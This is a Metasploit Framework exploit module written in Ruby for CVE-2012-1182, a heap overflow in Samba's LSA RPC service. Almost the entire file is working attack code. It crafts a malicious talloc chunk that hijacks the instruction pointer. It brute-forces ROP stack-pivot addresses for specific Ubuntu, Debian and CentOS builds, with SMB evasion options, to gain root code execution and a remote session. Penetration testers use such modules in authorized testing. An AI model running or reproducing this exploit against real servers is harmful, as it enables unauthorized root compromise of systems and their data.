##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'rex/proto/smb'
require 'rex/proto/ntlm'
require 'rex/proto/dcerpc'


class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Exploit::Remote::Tcp
	include Msf::Exploit::RopDb

	NDR = Rex::Encoder::NDR

	def initialize(info = {})
		super(update_info(info,
			'Name'	   => 'Samba SetInformationPolicy AuditEventsInfo Heap Overflow',
			'Description'    => %q{
					This module triggers a vulnerability in the LSA RPC service of the Samba daemon
				because of an error on the PIDL auto-generated code. Making a specially crafted
				call to SetInformationPolicy to set a PolicyAuditEventsInformation allows to
				trigger a heap overflow and finally execute arbitrary code with root privileges.

				The module uses brute force to guess the stackpivot/rop chain or the system()
				address and redirect flow there in order to bypass NX. The start and stop addresses
				for brute forcing have been calculated empirically. On the other hand the module
				provides the StartBrute and StopBrute which allow the user to configure his own
				addresses.
			},
			'Author'	 =>
				[
					'Unknown', # Vulnerability discovery
					'blasty', # Exploit
					'mephos', # Metasploit module
					'sinn3r', # Metasploit module
					'juan vazquez' # Metasploit module
				],
			'License'	=> MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2012-1182'],
					['OSVDB', '81303'],
					['BID', '52973'],
					['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-069/']
				],
			'Privileged'     => true,
			'Payload'	=>
				{
					'DisableNops' => true,
					'Space'       => 600,
				},
			'Platform'      => ['unix', 'linux'],
			# smbd process is killed soon after being exploited, need fork with meterpreter
			'DefaultOptions' => { "PrependSetreuid" => true, "PrependSetregid" => true, "PrependFork" => true, "AppendExit" => true, "WfsDelay" => 5},
			'Targets'	=>
				[
					['2:3.5.11~dfsg-1ubuntu2 on Ubuntu Server 11.10',
						{
							'Arch' => ARCH_X86,
							'Offset' => 0x11c0,
							'Ropname' => 'Ubuntu 11.10 / 2:3.5.8~dfsg-1ubuntu2',
							'Stackpivot' => 0x0004393c, # xchg eax, esp ; ret in /lib/i386-linux-gnu/libgcrypt.so.11.7.0
							'Start' => 0xb67f1000 ,
							'Stop'  => 0xb69ef000 ,
							'Step'  => 0x1000,
						}
					],
					['2:3.5.8~dfsg-1ubuntu2 on Ubuntu Server 11.10',
						{
							'Arch' => ARCH_X86,
							'Offset' => 0x11c0,
							'Ropname' => 'Ubuntu 11.10 / 2:3.5.8~dfsg-1ubuntu2',
							'Stackpivot' => 0x0004393c, # xchg eax, esp ; ret in /lib/i386-linux-gnu/libgcrypt.so.11.7.0
							'Start' => 0xb68d9000 ,
							'Stop'  => 0xb6ad7000 ,
							'Step'  => 0x1000,
						}
					],
					['2:3.5.8~dfsg-1ubuntu2 on Ubuntu Server 11.04',
						{
							'Arch' => ARCH_X86,
							'Offset' => 0x11c0,
							'Ropname' => 'Ubuntu 11.04 / 2:3.5.8~dfsg-1ubuntu2',
							# when stack pivoting, we control dword [esi] (field "next" in talloc chunk), ecx and [esp+4] point to shellcode
							'Stackpivot' => 0x0006af03, # pop ecx ; jmp dword [esi]  in /lib/i386-linux-gnu/libgcrypt.so.11.6.0
							# we jump on "pop ecx, jmp dword [esi] to remove 4 bytes from the stack, then jump on pop esp.. gadget
							# to effectively stack pivot
							'Stackpivot_helper' => 0x00054e87, #pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret  ;
							'Start' => 0xb6973000 ,
							'Stop'  => 0xb6b71000 ,
							'Step'  => 0x1000,
						}
					],
					# default version when installing 11.04 is 3.5.8 , 3.5.4 was PROPOSED on CD months before release date
					#['2:3.5.4~dfsg-1ubuntu8 on Ubuntu 11.04',
					#	{
					#		'Arch' => ARCH_CMD,
					#		'Offset' => 0x11c0,
					#		'Ropname' => 'Ubuntu 11.04 / 2:3.5.4~dfsg-1ubuntu8',
					#		'Stackpivot' => 0,
					#		'Bruteforce' =>
					#		{
					#			# The start should be 0x950 aligned, and then step 0x1000.
					#			'Start' => { 'Ret' => 0x00230950 },
					#			'Stop'  => { 'Ret' => 0x22a00950 },
					#			'Step'  => 0x1000
					#		}
					#	}
					#],
					['2:3.5.4~dfsg-1ubuntu8 on Ubuntu Server 10.10',
						{
							'Arch' => ARCH_X86,
							'Offset' => 0x11c0,
							'Ropname' => 'Ubuntu 10.10 / 2:3.5.4~dfsg-1ubuntu8',
							'Stackpivot' => 0x0003e4bc, #xchg eax, esp ; ret in libgcrypt.so.11.5.3
							'Start' => 0xb694f000 ,
							'Stop'  => 0xb6b4d000 ,
							'Step'  => 0x1000,
						}
					],
					['2:3.5.6~dfsg-3squeeze6 on Debian Squeeze',
						{
							'Arch' => ARCH_X86,
							'Offset' => 0x11c0,
							'Ropname' => 'Debian Squeeze / 2:3.5.6~dfsg-3squeeze6',
							'Stackpivot' => 0x0003e30c, #xchg eax, esp ; ret in libgcrypt.so.11.5.3
							'Start' => 0xb6962000 ,
							'Stop'  => 0xb6a61000 ,
							'Step'  => 0x1000,
						}
					],
					['3.5.10-0.107.el5 on CentOS 5',
						{
							'Arch' => ARCH_X86,
							'Offset' => 0x11c0,
							'Ropname' => '3.5.10-0.107.el5 on CentOS 5',
							'Stackpivot' => 0x0006ad7e, #xchg eax, esp ; xchg eax, ebx ; add eax, 0xCB313435 ; or ecx, eax ; ret in libgcrypt.so.11.5.2
							'Start' => 0x0037c000 ,
							'Stop'  => 0x09e73000 ,
							'Step'  => 0x1000,
						}
					]

				],
			'DisclosureDate' => 'Apr 10 2012',
			'DefaultTarget'  => 0
			))

		register_options([
			OptInt.new("StartBrute", [ false, "Start Address For Brute Forcing" ]),
			OptInt.new("StopBrute", [ false, "Stop Address For Brute Forcing" ]),
			OptInt.new('RPORT', [ true, 'Set the SMB service port', 445])
		], self.class)
		register_advanced_options(
		[
			OptBool.new('SMBDirect', [ true, 'The target port is a raw SMB service (not NetBIOS)', true ]),
			OptString.new('SMBUser', [ false, 'The username to authenticate as', '']),
			OptString.new('SMBPass', [ false, 'The password for the specified username', '']),
			OptString.new('SMBDomain',  [ false, 'The Windows domain to use for authentication', '.']),
			OptString.new('SMBName', [ true, 'The NetBIOS hostname (required for port 139 connections)', '*SMBSERVER']),
			OptBool.new('SMB::VerifySignature', [ true, "Enforces client-side verification of server response signatures", false]),
			OptInt.new('SMB::ChunkSize', [ true, 'The chunk size for SMB segments, bigger values will increase speed but break NT 4.0 and SMB signing', 500]),
			#
			# Control the identified operating system of the client
			#
			OptString.new('SMB::Native_OS', [ true, 'The Native OS to send during authentication', 'Windows 2000 2195']),
			OptString.new('SMB::Native_LM', [ true, 'The Native LM to send during authentication', 'Windows 2000 5.0']),

		], self.class)
		register_evasion_options(
		[
			OptBool.new('SMB::pipe_evasion',     [ true, 'Enable segmented read/writes for SMB Pipes', false]),
			OptInt.new('SMB::pipe_write_min_size', [ true, 'Minimum buffer size for pipe writes',  1]),
			OptInt.new('SMB::pipe_write_max_size', [ true, 'Maximum buffer size for pipe writes', 1024]),
			OptInt.new('SMB::pipe_read_min_size',  [ true, 'Minimum buffer size for pipe reads',  1]),
			OptInt.new('SMB::pipe_read_max_size',  [ true, 'Maximum buffer size for pipe reads', 1024]),
			OptInt.new('SMB::pad_data_level',  [ true, 'Place extra padding between headers and data (level 0-3)', 0]),
			OptInt.new('SMB::pad_file_level',  [ true, 'Obscure path names used in open/create (level 0-3)', 0]),
			OptInt.new('SMB::obscure_trans_pipe_level',  [ true, 'Obscure PIPE string in TransNamedPipe (level 0-3)', 0]),

		], self.class)
	end

	def exploit
		start = target["Start"]
		stop = target["Stop"]
		step = target["Step"]

		start = datastore["StartBrute"] if (datastore["StartBrute"] and datastore["StartBrute"] > 0 )
		stop  = datastore["StopBrute"] if (datastore["StopBrute"] and datastore["StopBrute"] > 0 )

		if start > stop
			raise ArgumentError, "StartBrute should not be larger than StopBrute"
		end

		curr_addr = start
		i = 0
		count = (stop-start)/step

		thread_nb = 20
		t = []

		while curr_addr <= stop and not session_created?
			while t.length < thread_nb
				break if session_created?
				i += 1
				tcp = connect(false)
				t << framework.threads.spawn("Module(#{self.refname})-#{curr_addr}",false, curr_addr, i, count, tcp) do |addr, i, count, tcp|
					begin
						ok = false
						err_count = 0
						while ok != true and not session_created?
							begin
								do_one(addr, i, count, tcp)
								ok = true
							rescue ::Exception => e
								print_status("The following  error was encountered: #{e.class} #{e}, sleeping 1s and retrying with same address")
								select(nil, nil, nil, 1)
								err_count += 1
								# dont loop indefinitely
								if err_count == 3
									ok = true
								end
							end
						end
					end
				end
				curr_addr += step
				break if curr_addr > stop
			end
			t.first.join
			t.delete_if { |x| not x.alive? }
		end
		if not session_created?
			print_error("Exploit failed")
		else
			print_good("Exploit succeeded")
		end
	end

	def check
		begin
			tcp = connect(false)
			c = my_smb_login(tcp)
			disconnect(tcp)

			native_lm = c.client.peer_native_lm
			#let's be paranoid
			if native_lm
				version = native_lm.scan(/Samba (\d\.\d.\d*)/).flatten[0]
				if version
					minor_str = version.scan(/\.(\d*)$/).flatten[0]
					if minor_str
						minor   = minor_str.to_i
						print_status("Version found: #{version}")

						return Exploit::CheckCode::Appears if version =~ /^3\.4/ and minor < 16
						return Exploit::CheckCode::Appears if version =~ /^3\.5/ and minor < 14
						return Exploit::CheckCode::Appears if version =~ /^3\.6/ and minor < 4

						return Exploit::CheckCode::Safe
					else
						return CheckCode::Unknown
					end
				else
					return CheckCode::Unknown
				end
			else
				return CheckCode::Unknown
			end

		rescue ::Exception
			return CheckCode::Unknown
		end
	end

	def do_one(addr, i, count, tcp)
		print_status("Trying to exploit Samba with address 0x%.8x (%i/%i)..." % [addr, i, count])
		datastore['DCERPC::fake_bind_multi'] = false
		datastore['DCERPC::max_frag_size'] = 4248
		datastore['DCERPC::smb_pipeio'] = 'trans'
		datastore['DCERPC::ReadTimeout'] = 3

		pipe = "lsarpc"
		# decrease thread priority, otherelse meterpreter .so cannot be sent as too much traffic is being sent by other threads
		Thread.current.priority = -1

		c = my_smb_login(tcp)

		my_handle = my_dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', ["\\#{pipe}"], self.rhost)
		my_dcerpc = my_dcerpc_bind(my_handle, tcp, c)
		my_dcerpc.socket.mode = 'rw'
		# revert for other exploits
		datastore['DCERPC::smb_pipeio'] = 'rw'

		cmd = ";;;;" # padding
		helper = 0
		if target['Arch'] == ARCH_CMD
			cmd << "#{payload.encoded}\x00" # system argument
			tmp = cmd * (816/cmd.length)
			tmp << "\x00"*(816-tmp.length)
			ret_addr =  addr
		elsif target['Arch'] == ARCH_X86
			cmd << generate_rop_payload('samba', payload.encoded,{'target'=>target['Ropname'], 'base'=> addr })
			tmp = cmd
			tmp << "\x00"*(816-tmp.length)
			ret_addr = addr+target['Stackpivot']
			# will help in stack pivot when it's not eax pointing to shellcode
			if target['Stackpivot_helper']
				helper = addr+target['Stackpivot_helper']
			end
		end

		stub = "X" * 20

		stub << NDR.short(2)     # level
		stub << NDR.short(2)     # level 2
		stub << NDR.long(1)      # auditing mode
		stub << NDR.long(1)      # ptr
		stub << NDR.long(100000) # r-> count
		stub << NDR.long(20)     # array size
		stub << NDR.long(0)
		stub << NDR.long(100)
		stub << rand_text_alpha(target['Offset'])

		# Crafted talloc chunk
		#stub << 'A' * 8			   # next, prev
		stub << NDR.long(helper) + 'A'*4	# next, prev
		stub << NDR.long(0) + NDR.long(0)     # parent, child
		stub << NDR.long(0)		   # refs
#		stub << NDR.long(target_addrs['Ret']) # destructor # will become EIP
		stub << NDR.long(ret_addr) # destructor # will become EIP
		stub << NDR.long(0)		   # name
		stub << "AAAA"			# size
		stub << NDR.long(0xe8150c70)	  # flags
		stub << "AAAABBBB"
		stub << tmp # pointer to tmp+4 in $esp
		stub << rand_text(32632)
		stub << rand_text(62000)

		begin
			call(my_dcerpc, 0x08, stub)
		rescue Rex::Proto::DCERPC::Exceptions::NoResponse, Rex::Proto::SMB::Exceptions::NoReply, ::EOFError
		rescue Rex::Proto::DCERPC::Exceptions::Fault
			print_error('Server is most likely patched...')
		rescue Timeout::Error
			print_status("Timeout")
		rescue Rex::Proto::SMB::Exceptions::LoginError
			print_status("Rex::Proto::SMB::Exceptions::LoginError")
		rescue => e
			if e.to_s =~ /STATUS_PIPE_DISCONNECTED/
				print_status('Server disconnected, this is expected')
			end
		end
		handler()
		disconnect(tcp)
	end

	# Perform a DCE/RPC Function Call
	def call(dcerpc, function, data, do_recv = true)

		frag_size = data.length
		if dcerpc.options['frag_size']
			frag_size = dcerpc.options['frag_size']
		end
		object_id = ''
		if dcerpc.options['object_call']
			object_id = dcerpc.handle.uuid[0]
		end
		if options['random_object_id']
			object_id = Rex::Proto::DCERPC::UUID.uuid_unpack(Rex::Text.rand_text(16))
		end

		call_packets = make_request(function, data, frag_size, dcerpc.context, object_id)
		call_packets.each { |packet|
			write(dcerpc, packet)
		}

		return true if not do_recv

		raw_response = ''

		begin
			raw_response = dcerpc.read()
		rescue ::EOFError
			raise Rex::Proto::DCERPC::Exceptions::NoResponse
		end

		if (raw_response == nil or raw_response.length == 0)
			raise Rex::Proto::DCERPC::Exceptions::NoResponse
		end


		dcerpc.last_response = Rex::Proto::DCERPC::Response.new(raw_response)

		if dcerpc.last_response.type == 3
			e = Rex::Proto::DCERPC::Exceptions::Fault.new
			e.fault = dcerpc.last_response.status
			raise e
		end

		dcerpc.last_response.stub_data
	end

	# Used to create standard DCERPC REQUEST packet(s)
	def make_request(opnum=0, data="", size=data.length, ctx=0, object_id = '')

		opnum = opnum.to_i
		size  = size.to_i
		ctx   = ctx.to_i

		chunks, frags = [], []
		ptr = 0

		# Break the request into fragments of 'size' bytes
		while ptr < data.length
			chunks.push( data[ ptr, size ] )
			ptr += size
		end

		# Process requests with no stub data
		if chunks.length == 0
			frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(3, opnum, '', ctx, object_id) )
			return frags
		end

		# Process requests with only one fragment
		if chunks.length == 1
			frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(3, opnum, chunks[0], ctx, object_id) )
			return frags
		end

		# Create the first fragment of the request
		frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(1, opnum, chunks.shift, ctx, object_id) )

		# Create all of the middle fragments
		while chunks.length != 1
			frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(0, opnum, chunks.shift, ctx, object_id) )
		end

		# Create the last fragment of the request
		frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(2, opnum, chunks.shift, ctx, object_id) )

		return frags
	end

	# Write data to the underlying socket
	def write(dcerpc, data)
		dcerpc.socket.write(data)
		data.length
	end

	def my_smb_login(tcp)

		c = Rex::Proto::SMB::SimpleClient.new(tcp, true)

		c.login(
			datastore['SMBName'],
			datastore['SMBUser'],
			datastore['SMBPass'],
			datastore['SMBDomain'],
			datastore['SMB::VerifySignature'],
			datastore['NTLM::UseNTLMv2'],
			datastore['NTLM::UseNTLM2_session'],
			datastore['NTLM::SendLM'],
			datastore['NTLM::UseLMKey'],
			datastore['NTLM::SendNTLM'],
			datastore['SMB::Native_OS'],
			datastore['SMB::Native_LM'],
			{:use_spn => datastore['NTLM::SendSPN'], :name =>  self.rhost}
		)
		c.connect("\\\\#{datastore['RHOST']}\\IPC$")
		return c
	end


	def my_dcerpc_handle(uuid, version, protocol, opts, rhost)
		return Rex::Proto::DCERPC::Handle.new([uuid, version], protocol, rhost, opts)

	end

	def my_dcerpc_bind(h, tcp, smb_client = nil)
		opts = { 'Msf' => framework, 'MsfExploit' => self }

		if datastore['DCERPC::max_frag_size']
			opts['frag_size'] = datastore['DCERPC::max_frag_size']
		end

		if datastore['DCERPC::fake_bind_multi']
			opts['fake_multi_bind'] = 1

			if datastore['DCERPC::fake_bind_multi_prepend']
				opts['fake_multi_bind_prepend'] = datastore['DCERPC::fake_bind_multi_prepend']
			end

			if datastore['DCERPC::fake_bind_multi_append']
				opts['fake_multi_bind_append'] = datastore['DCERPC::fake_bind_multi_append']
			end
		end

		opts['connect_timeout'] = (datastore['ConnectTimeout'] || 10).to_i

		opts['read_timeout']    = (datastore['DCERPC::ReadTimeout'] || 10).to_i


		# Configure the SMB evasion options

		if datastore['SMBUser']
			opts['smb_user'] = datastore['SMBUser']
		end

		if datastore['SMBPass']
			opts['smb_pass'] = datastore['SMBPass']
		end

		if datastore['DCERPC::smb_pipeio']
			opts['smb_pipeio'] = datastore['DCERPC::smb_pipeio']
		end

		if datastore['SMB::pipe_write_min_size']
			opts['pipe_write_min_size'] = datastore['SMB::pipe_write_min_size']
		end

		if datastore['SMB::pipe_write_max_size']
			opts['pipe_write_max_size'] = datastore['SMB::pipe_write_max_size']
		end

		if datastore['SMB::pipe_read_min_size']
			opts['pipe_read_min_size'] = datastore['SMB::pipe_read_min_size']
		end
		if datastore['SMB::pipe_read_max_size']
			opts['pipe_read_max_size'] = datastore['SMB::pipe_read_max_size']
		end
		if smb_client
			opts['smb_client'] = smb_client
		end

		# Create the DCERPC client
		my_dcerpc = Rex::Proto::DCERPC::Client.new(h, tcp, opts)

		return my_dcerpc
	end
end
